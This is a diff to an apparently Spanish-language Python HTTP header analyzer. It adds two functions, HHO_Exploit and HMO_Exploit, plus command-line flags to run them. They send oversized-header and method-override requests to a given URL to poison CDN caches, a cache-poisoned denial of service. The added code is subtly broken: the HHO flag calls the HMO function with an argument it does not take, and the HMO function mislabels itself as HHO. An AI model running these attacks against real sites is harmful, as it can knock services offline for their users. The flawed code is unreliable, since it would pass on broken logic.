@@ -202,7 +202,7 @@ def detectar_cdn(headers):
         "Cloudflare": ["cf-ray", "cf-cache-status", "server:cloudflare","Cf-Connecting-IP","CF-EW-Via","CF-Pseudo-IPv4","CF-IPCountry","CDN-Loop","CF-Worker"],
         "CloudFront": ["x-amz-cf-","server:cloudfront", "via:1.1 cloudfront","CloudFront-Viewer-Address","CloudFront-Viewer-Address","CloudFront-Viewer-Country-Region","CloudFront-Viewer-Header-Order"],
         "Fastly": ["fastly-cachetype", "x-fastly-request-id","fastly-"],
-        "Envoy":["x-envoy-","x-datadog-"],
+        "Envoy":["x-envoy-","x-datadog-","server:envoy"],
         "Varnish": ["via: 1.1 varnish"],
     }
 
@@ -361,15 +361,152 @@ def analizar_cpdos(url):
         if h in headers:
             print(f"{Fore.MAGENTA}{h}: {Fore.WHITE}{headers[h]}{Style.RESET_ALL}")
     
+import http.client
+import urllib.parse
+
+def HHO_Exploit(target_url: str, payload_size: int, header_to_exploit: str):
+    
+    try:
+        # Parsear la URL para obtener host, puerto y ruta
+        parsed_url = urllib.parse.urlparse(target_url)
+
+        host = parsed_url.hostname
+        port = parsed_url.port if parsed_url.port else (80 if parsed_url.scheme == 'http' else 443)
+        path = parsed_url.path
+        if not path: # Asegura que la ruta no esté vacía
+            path = "/"
+        if parsed_url.query: # Añade la query string si existe
+            path += "?" + parsed_url.query
+
+        scheme = parsed_url.scheme
+
+        print(f"\n--- Iniciando ataque HHO a {target_url} ---")
+        print(f"Host: {host}, Puerto: {port}, Ruta: {path}")
+        print(f"Tamaño del payload: {payload_size} caracteres")
+        print(f"Cabecera a explotar: '{header_to_exploit}'")
+
+        big_header_value = "A" * payload_size
+
+        # Diccionario de encabezados
+        headers = {
+            header_to_exploit: big_header_value
+        }
+
+        # Conectar al servidor (usando HTTPSConnection si el esquema es https)
+        if scheme == 'https':
+            conn = http.client.HTTPSConnection(host, port)
+        else:
+            conn = http.client.HTTPConnection(host, port)
+
+        # Realizar la petición GET
+        conn.request("GET", path, headers=headers)
+
+        # Obtener y procesar la respuesta
+        res = conn.getresponse()
+        print("\n--- Respuesta del servidor ---")
+        print(f"Código de estado: {res.status}")
+        print(f"Razón: {res.reason}")
+
+        # Imprimir cabeceras de respuesta para ver X-Cache, X-Varnish, etc.
+        print("\nCabeceras de respuesta:")
+        for header, value in res.getheaders():
+            print(f"  {header}: {value}")
+
+        body = res.read().decode("utf-8", errors="replace")
+        print("\nContenido de la respuesta:")
+        print(body)
+
+    except http.client.HTTPException as e:
+        print(f"\n¡Error HTTP al conectar o enviar la solicitud: {e}")
+    except ConnectionRefusedError:
+        print(f"\n¡Error: Conexión rechazada! Asegúrate de que Varnish está corriendo en {host}:{port}.")
+    except ValueError as e:
+        print(f"\n¡Error de URL o puerto: {e}. Asegúrate de que la URL es válida.")
+    except Exception as e:
+        print(f"\n¡Ha ocurrido un error inesperado: {e}")
+    finally:
+        # Asegurar que la conexión se cierra
+        if 'conn' in locals() and conn:
+            conn.close()
+            print("\n--- Conexión cerrada ---")
+            
+            
+def HMO_Exploit(target_url: str, header_to_exploit: str, method_to_exploit:str):
+    
+    try:
+        # Parsear la URL para obtener host, puerto y ruta
+        parsed_url = urllib.parse.urlparse(target_url)
+
+        host = parsed_url.hostname
+        port = parsed_url.port if parsed_url.port else (80 if parsed_url.scheme == 'http' else 443)
+        path = parsed_url.path
+        if not path: # Asegura que la ruta no esté vacía
+            path = "/"
+        if parsed_url.query: # Añade la query string si existe
+            path += "?" + parsed_url.query
+
+        scheme = parsed_url.scheme
+
+        print(f"\n--- Iniciando ataque HHO a {target_url} ---")
+        print(f"Host: {host}, Puerto: {port}, Ruta: {path}")
+        print(f"Method de explotaciopn: {method_to_exploit}")
+        print(f"Cabecera a explotar: '{header_to_exploit}'")
+
+        # Diccionario de encabezados
+        headers = {
+            header_to_exploit: method_to_exploit
+        }
+
+        # Conectar al servidor (usando HTTPSConnection si el esquema es https)
+        if scheme == 'https':
+            conn = http.client.HTTPSConnection(host, port)
+        else:
+            conn = http.client.HTTPConnection(host, port)
+
+        # Realizar la petición GET
+        conn.request("GET", path, headers=headers)
+
+        # Obtener y procesar la respuesta
+        res = conn.getresponse()
+        print("\n--- Respuesta del servidor ---")
+        print(f"Código de estado: {res.status}")
+        print(f"Razón: {res.reason}")
+
+        # Imprimir cabeceras de respuesta para ver X-Cache, X-Varnish, etc.
+        print("\nCabeceras de respuesta:")
+        for header, value in res.getheaders():
+            print(f"  {header}: {value}")
+
+        body = res.read().decode("utf-8", errors="replace")
+        print("\nContenido de la respuesta:")
+        print(body)
+
+    except http.client.HTTPException as e:
+        print(f"\n¡Error HTTP al conectar o enviar la solicitud: {e}")
+    except ConnectionRefusedError:
+        print(f"\n¡Error: Conexión rechazada! Asegúrate de que Varnish está corriendo en {host}:{port}.")
+    except ValueError as e:
+        print(f"\n¡Error de URL o puerto: {e}. Asegúrate de que la URL es válida.")
+    except Exception as e:
+        print(f"\n¡Ha ocurrido un error inesperado: {e}")
+    finally:
+        # Asegurar que la conexión se cierra
+        if 'conn' in locals() and conn:
+            conn.close()
+            print("\n--- Conexión cerrada ---")
 
 if __name__ == "__main__":
     try:
         parser = argparse.ArgumentParser(description="Analizador avanzado de encabezados HTTP")
         parser.add_argument("-u", "--url", help="URL a analizar", required=True)
+        parser.add_argument("-s", "--scan", help="modo de escaner",action="store_true")
         parser.add_argument("-H", "--header", help="Encabezado personalizado (ej: 'X-Forwarded-Host: ejemplo.com')", action="append")
         parser.add_argument("-FF", "--fullFuzzing",help="Realizar Fuzzing con todos los encabezados (por defecto 10)",action="store_true")
         parser.add_argument("-w", "--wordlist", help="Ruta a archivo de wordlist (formato 'encabezado:valor')")
         parser.add_argument("-CP", "--cachePoisoned", help="Analisis de Cache Poising",action="store_true")
+        parser.add_argument("-eHHO", "--exploitHHO", help="Explotacion de HHO pasar el tamano de la carga")
+        parser.add_argument("-eHMO", "--exploitHMO", help="Explotacion de HMO pasar la cabecera y el metodo por -H",action="store_true")
+        
         args = parser.parse_args()
 
         custom_headers = {}
@@ -378,10 +515,24 @@ if __name__ == "__main__":
                 key, value = h.split(":", 1)
                 custom_headers[key.strip()] = value.strip()
 
-        response= analizar_encabezados_y_recomendar(args.url, custom_headers)
-        fuzzing_encabezados(args.url,args.fullFuzzing,args.wordlist,response)
+        
+        
+        if not (args.exploitHHO == None) : 
+            if len(custom_headers) ==0: print(f"\n [STOP] Para este modo se necesita que introduca el parametro -H")
+            else: HMO_Exploit(target_url=args.url,payload_size= int(args.exploitHHO),header_to_exploit=list(custom_headers.keys())[0])
+            
+        if args.exploitHMO:
+            if len(custom_headers) ==0: print(f"\n [STOP] Para este modo se necesita que introduca el parametro -H")
+            else: 
+                first_value=list(custom_headers.keys())[0]
+                HMO_Exploit(target_url=args.url,header_to_exploit=first_value,method_to_exploit=custom_headers[first_value])
+            
         if args.cachePoisoned : analizar_cpdos(args.url)
-    
+        if args.scan: 
+            response= analizar_encabezados_y_recomendar(args.url, custom_headers)
+            fuzzing_encabezados(args.url,args.fullFuzzing,args.wordlist,response)
+        if args.cachePoisoned : analizar_cpdos(args.url)
+        
     except KeyboardInterrupt:
         print("\n[STOP] Programa detenido por el usuario (Ctrl+C).")
         sys.exit(0)
